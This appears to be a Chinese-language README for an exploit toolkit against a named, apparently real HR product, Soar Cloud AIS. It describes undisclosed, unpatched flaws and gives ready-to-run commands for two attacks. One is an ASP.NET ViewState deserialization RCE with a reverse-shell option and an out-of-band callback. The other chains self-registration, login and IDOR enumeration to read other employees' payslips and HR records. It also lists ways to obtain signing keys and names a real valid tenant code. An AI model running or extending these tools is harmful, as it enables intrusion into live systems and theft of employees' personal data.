# Soar Cloud AIS 人資系統 — 利用工具集 (normal · author-and-handoff)

> **normal** — 产品特定发现。厂商未披露/未修复，但漏洞限于本产品（Soar Cloud AIS），
> 非跨产品通杀。外发时仍须经 `poc-package` 脱敏 + (如需二进制) garble 混淆。

| 项 | 值 |
|---|---|
| 产品 | 飛騰雲端 AIS 人資系統 (Soar Cloud AIS HR) + eServices 门户 |
| 厂商 | 飛騰雲端系統股份有限公司 (Soar Cloud System) |
| 栈 | AIS: ASP.NET WebForms 4.7.2 + DevExpress; eServices: ASP.NET Core Identity |
| 关联 run | `runs/scshr_20260614/` (证据 E-001..E-015) |
| 关联知识 | `knowledge/soarcloud-ais-hr.md` (识别签名 + 弱点锚点) |
| 识别常量 | `__VIEWSTATEGENERATOR=E9414691` (跨租户一致 → 共享代码库/配置) |
| 状态 | 注册越权=已确认(E-005); ViewState RCE=条件性(需 machineKey); IDOR=post-auth 待验 |

---

## 工具 1 — `viewstate_rce.py` : ASP.NET ViewState 反序列化 RCE

**原理.** AIS Web 客户端 (`/scsrwd/*.aspx`) 是 WebForms。登录页【预认证】即带非空
`__VIEWSTATE` + 固定 `__VIEWSTATEGENERATOR=E9414691`。ViewState MAC 已启用 (伪造未签名
ViewState → `錯誤訊息`/Error.aspx, 见 E-008), 因此利用**前提是拿到目标 machineKey**。
一旦有密钥, 用 ysoserial.net 生成【经目标 machineKey 正确签名(+加密)】的恶意 ViewState,
LosFormatter 反序列化触发 .NET gadget → **未认证 RCE**。本产品已升 .NET 4.7.2 → 走 4.5
ViewState 方案, 故 ysoserial 必须带 `--path`(请求路径) / `--apppath`(应用根, 取自页面
`__ROOTPATH`, 通常 `/SCSRwd/`) / `--generator`。工具会自动从页面抓取这些并镜像整个回发表单。

**machineKey 获取 (handoff 时由操作者完成).**
1. `web.config`/machineKey 泄露: 备份 (`web.config.bak/.old/~`)、源码泄露、任意文件读/LFI、
   栈回显、或 "可透過 Tools 進行資料庫加密" 类管理工具旁路落配置。
2. **共享/默认密钥**: generator 跨租户一致 = 一份配置多实例 → 若用了示例/默认 machineKey,
   一把钥匙通吃所有租户。比对公开 machineKey 字典 (BlackList3r / AspDotNetWrapper)。
3. 公开泄露密钥集合碰撞。
无密钥工具直接拒跑 (不空打盲发)。

**用法.**
```bash
# 证明级 (OOB 回连验证, 可逆无落地)
python viewstate_rce.py --url https://<target>/scsrwd/Login.aspx \
  --validationkey <HEX> --validationalg HMACSHA256 \
  --decryptionkey <HEX> --decryptionalg AES --isencrypted \
  --ysoserial ./ysoserial.exe --cmd "nslookup p.<your-collab>"
# 完整影响 (反弹 shell, 操作者执行)
python viewstate_rce.py --url https://<target>/scsrwd/Login.aspx \
  --validationkey <HEX> --validationalg HMACSHA256 --ysoserial ./ysoserial.exe \
  --revshell <LHOST> <LPORT>
```
gadget 默认 `TextFormattingRunProperties` (LosFormatter 友好); 可换
`TypeConfuseDelegate` / `ActivitySurrogateSelector`。RCE 多为盲打 → 用 OOB/反连/时延确认。

---

## 工具 2 — `eservices_postauth.py` : 注册→登录→IDOR 越权链

**原理.** eServices (`:9956`, ASP.NET Core Identity) **开放自助注册** (E-005 已确认):
任意邮箱 + 未校验 `CustomerID` + 弱口令 (≥6) 即建持久账号。登录疑受邮件确认门 (E-006) →
用**自有真实邮箱**注册并点确认链接即可登录, 取得员工自助会话 → 对带对象 ID 的端点 (薪资单/
个人资料/考勤) 做 IDOR 差分, 越权读取他人 HR 数据。

**用法.**
```bash
python eservices_postauth.py register --base https://<target>:9956 \
   --email you@yourbox.tld --password 'Aa1!aaaa' --customerid <valid-or-empty>
# 收邮件 → 点确认链接
python eservices_postauth.py login --base https://<target>:9956 \
   --email you@yourbox.tld --password 'Aa1!aaaa' --jar sess.txt
python eservices_postauth.py enum --base https://<target>:9956 --jar sess.txt
python eservices_postauth.py idor --base https://<target>:9956 --jar sess.txt \
   --template '/eService/PaySlip?empId={id}' --start 1000 --count 15
# E-005 0.5 子结论确证 (注册层是否校验租户码):
python eservices_postauth.py register --base https://<target>:9956 \
   --password 'Aa1!aaaa' --customerid-matrix --maildomain yourbox.tld
```
`idor` 默认**证明级**(小范围 + 仅差分, 不落库); 全量抽取请显式 `--dump`, 由操作者决定执行
(拖库类全量动作不在驱动自动执行范围内 — `src-safety-boundary`)。

**已知有效租户码**: `SCS001` (从 AIS 登录公司码列校验回显得到, E-010)。属真实目标产物,
**勿随工具公开**; 仅本地/操作者用。

---

## 验证矩阵 (上线前自检)
1. `viewstate_rce.py`: 无密钥 → 应拒跑; 给错 alg/path → 应见 MAC 拒绝错误页 (说明投递与解析路径通)。
2. `eservices_postauth.py register --customerid-matrix`: 三种 CustomerID 均成功 = 注册层不校验 (E-012)。
3. `idor`: 多个 id 返回不同数据 = 横向越权确认。

## Handoff / 脱敏
- 本目录为 **normal**（产品特定发现，非通杀），仅本地 + 交操作者带外执行。
- 工具已参数化目标 (`<target>`), 无硬编码真实域名/凭据; 唯一真实产物 `SCS001` 见上, 勿公开。
- 若日后披露+修复 → 补 CVE/CNVD 编号。
